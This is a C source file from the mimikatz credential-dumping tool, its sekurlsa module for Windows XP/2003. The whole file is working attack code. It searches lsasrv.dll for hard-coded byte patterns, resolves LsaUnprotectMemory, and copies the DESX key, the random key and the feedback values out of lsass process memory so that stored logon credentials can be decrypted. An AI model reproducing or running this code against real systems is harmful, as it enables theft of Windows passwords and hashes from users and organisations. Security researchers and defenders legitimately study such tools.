/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_nt5.h"

#ifdef _M_X64
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
LONG OFFS_WNT5_g_Feedback								= -67;
LONG OFFS_WNT5_g_pRandomKey								= -17;
LONG OFFS_WNT5_g_pDESXKey								= -35;
LONG OFFS_WNT5_g_cbRandomKey							= -24;
#elif defined _M_IX86
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x84, 0xc0, 0x74, 0x44, 0x6a, 0x08, 0x68};
LONG OFFS_WNT5_g_Feedback								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_g_pRandomKey								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 15;
LONG OFFS_WNT5_g_pDESXKey								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 21;
LONG OFFS_WNT5_g_cbRandomKey							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 32;

BYTE PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xc0, 0x0f, 0x84, 0xe5, 0xe8, 0x00, 0x00, 0x6a, 0x08, 0x68};
LONG OFFS_WNT5_old_g_Feedback							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
LONG OFFS_WNT5_old_g_pRandomKey							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 19;
LONG OFFS_WNT5_old_g_pDESXKey							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 25;
LONG OFFS_WNT5_old_g_cbRandomKey						= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 36;
#endif

HMODULE kuhl_m_sekurlsa_nt5_hLsasrv = NULL;
NTSTATUS kuhl_m_sekurlsa_nt5_KeyInit = STATUS_NOT_FOUND;
PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt5_pLsaProtectMemory = NULL, kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = NULL;

PBYTE g_Feedback, *g_pRandomKey, *g_pDESXKey;
PDWORD g_cbRandomKey;

NTSTATUS kuhl_m_sekurlsa_nt5_init()
{
	struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable;
	KULL_M_MEMORY_ADDRESS aMemory = {&extractPkgFunctionTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION vbInfos;
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
	#ifdef _M_IX86
		BOOL isOld;
	#endif
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
	{
		if(!kuhl_m_sekurlsa_nt5_hLsasrv)
			kuhl_m_sekurlsa_nt5_hLsasrv = LoadLibrary(L"lsasrv");
		
		if(kuhl_m_sekurlsa_nt5_hLsasrv)
		{
			if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"lsasrv.dll", &vbInfos))
			{
				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
				#ifdef _M_IX86
				isOld = (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_2K3) && (vbInfos.TimeDateStamp < 0x45D71BC6);
				#endif

				if(!kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
				{
					if(
					(extractPkgFunctionTable.LsaICancelNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaICancelNotification")) &&
					(extractPkgFunctionTable.LsaIRegisterNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaIRegisterNotification"))
					)
					{
						if(kull_m_memory_search(&aMemory, sizeof(extractPkgFunctionTable), &sMemory, FALSE))
						{
							kuhl_m_sekurlsa_nt5_pLsaProtectMemory = ((PLSA_SECPKG_FUNCTION_TABLE) ((PBYTE) sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaProtectMemory;
							kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = ((PLSA_SECPKG_FUNCTION_TABLE) ((PBYTE) sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaUnprotectMemory;
						}
					}
				}

				if(kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
				{
						aMemory.address = PTRN_WNT5_LsaInitializeProtectedMemory_KEY;
					#ifdef _M_IX86
						if(isOld)
						{
							aMemory.address = PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY;
							sizeOfSearch = sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
						}
					#endif
					
					if(kull_m_memory_search(&aMemory, sizeOfSearch, &sMemory, FALSE))
					{
					#ifdef _M_X64
							g_Feedback		= (PBYTE  )(((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback)		+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback));
							g_pRandomKey	= (PBYTE *)(((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey));
							g_pDESXKey		= (PBYTE *)(((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey)		+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey));
							g_cbRandomKey	= (PDWORD )(((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey));
					#elif defined _M_IX86
							g_Feedback		= *(PBYTE  *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_Feedback	: OFFS_WNT5_g_Feedback));
							g_pRandomKey	= *(PBYTE **)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_pRandomKey	: OFFS_WNT5_g_pRandomKey));
							g_pDESXKey		= *(PBYTE **)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_pDESXKey	: OFFS_WNT5_g_pDESXKey));
							g_cbRandomKey	= *(PDWORD *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_cbRandomKey	: OFFS_WNT5_g_cbRandomKey));
					#endif
						if(g_Feedback && g_pRandomKey && g_pDESXKey && g_cbRandomKey)
						{
							*g_cbRandomKey	= 256;
							*g_pRandomKey	= (PBYTE) LocalAlloc(LPTR, *g_cbRandomKey);
							*g_pDESXKey		= (PBYTE) LocalAlloc(LPTR, 144);

							if(*g_pRandomKey && *g_pDESXKey)
								kuhl_m_sekurlsa_nt5_KeyInit = STATUS_SUCCESS;
						}
					}
					else PRINT_ERROR(L"kull_m_memory_search\n");
				}
			}
		}
	}
	return kuhl_m_sekurlsa_nt5_KeyInit;
}

NTSTATUS kuhl_m_sekurlsa_nt5_clean()
{
	if(g_pRandomKey)
		LocalFree(*g_pRandomKey);
	if(g_pDESXKey)
		LocalFree(*g_pDESXKey);
	if(kuhl_m_sekurlsa_nt5_hLsasrv)
		FreeLibrary(kuhl_m_sekurlsa_nt5_hLsasrv);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
	LONG offFeedBack = OFFS_WNT5_g_Feedback, offpDESXKey = OFFS_WNT5_g_pDESXKey, offpRandomKey = OFFS_WNT5_g_pRandomKey;
#ifdef _M_X64
	LONG offset64;
#elif defined _M_IX86
	if((cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_2K3) && (lsassLsaSrvModule->TimeDateStamp < 0x45D71BC6))
	{
		aLocalMemory.address = PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY;
		sizeOfSearch = sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
		offFeedBack = OFFS_WNT5_old_g_Feedback;
		offpDESXKey = OFFS_WNT5_old_g_pDESXKey;
		offpRandomKey = OFFS_WNT5_old_g_pRandomKey;
	}
#endif
	
	if(kull_m_memory_search(&aLocalMemory, sizeOfSearch, &sMemory, FALSE))
	{
		aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack;
#ifdef _M_X64
		aLocalMemory.address = &offset64;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack + sizeof(LONG) + offset64;
#elif defined _M_IX86
		aLocalMemory.address = &aLsassMemory.address;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
		{
#endif
			aLocalMemory.address = g_Feedback;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, 8))
			{
				aLsassMemory.address = (PBYTE) sMemory.result + offpDESXKey;
				if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pDESXKey, 144))
				{
					aLsassMemory.address = (PBYTE) sMemory.result + offpRandomKey;
					if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pRandomKey, 256))
						status = STATUS_SUCCESS;
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
#ifdef _M_X64
	LONG offset64;
	aLocalMemory.address = &offset64;
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
	{
		aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
		aLocalMemory.address = &aLsassMemory->address;
#elif defined _M_IX86
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
	{
#endif
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
			aLocalMemory.address = Key;
			status = kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille);
		}
	}
	return status;
}